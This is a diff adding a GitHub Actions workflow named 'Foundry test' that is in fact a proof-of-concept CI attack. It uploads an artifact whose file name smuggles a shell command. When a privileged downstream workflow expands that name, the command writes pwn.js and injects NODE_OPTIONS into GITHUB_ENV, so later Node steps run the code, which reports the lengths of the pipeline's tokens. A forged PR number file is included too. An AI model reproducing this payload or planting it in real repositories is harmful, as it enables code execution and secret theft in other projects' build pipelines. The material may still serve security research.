@@ -1,0 +1,20 @@
+name: Foundry test
+
+on:
+  pull_request:
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft attacker artifact
+        run: |
+          mkdir -p out
+          PAY='$(node -e '"'"'require(`fs`).writeFileSync(`pwn.js`,`console.log(String.fromCharCode(80,87,78,82,65,78),(process.env.INPUT_TOKEN||String()).length,(process.env.INPUT_GITHUB_TOKEN||String()).length)`);require(`fs`).appendFileSync(process.env.GITHUB_ENV,`NODE_OPTIONS=--require=pwn.js`+String.fromCharCode(10))'"'"').txt'
+          printf 'x\n' > "out/$PAY"
+          printf '115\n' > out/pr_number.txt
+          ls -la out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content-poc
+          path: out
